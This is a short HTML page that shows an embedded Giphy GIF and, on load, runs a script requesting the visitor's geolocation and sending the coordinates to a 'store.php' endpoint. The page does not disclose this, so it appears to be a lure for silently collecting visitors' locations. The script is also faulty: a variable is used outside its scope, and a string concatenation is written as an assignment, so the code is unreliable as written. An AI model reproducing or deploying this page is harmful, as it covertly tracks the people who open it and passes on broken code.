<!DOCTYPE html>
<html>

<body onload="getLocation()">

    <iframe src="https://giphy.com/embed/y9ybtG6ODK88LOK8H2" width="361" height="480" style="" frameBorder="0"
        class="giphy-embed" allowFullScreen></iframe>
    <p><a href="https://giphy.com/gifs/cameo-mike-tyson-iron-kid-dynamite-y9ybtG6ODK88LOK8H2">via GIPHY</a></p>


    <p id="demo"></p>

    <script>
        const x = document.getElementById("demo");

        function getLocation() {
            const xhttp = new XMLHttpRequest();
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(showPosition);
            } else {
                x.innerHTML = "Geolocation is not supported by this browser.";
            }
        }

        function showPosition(position) {
            xhttp.open("GET", "store.php?lat=" + position.coords.latitude = "&long=" + position.coords.longitude);
            xhttp.send();

        }
    </script>

</body>

</html>
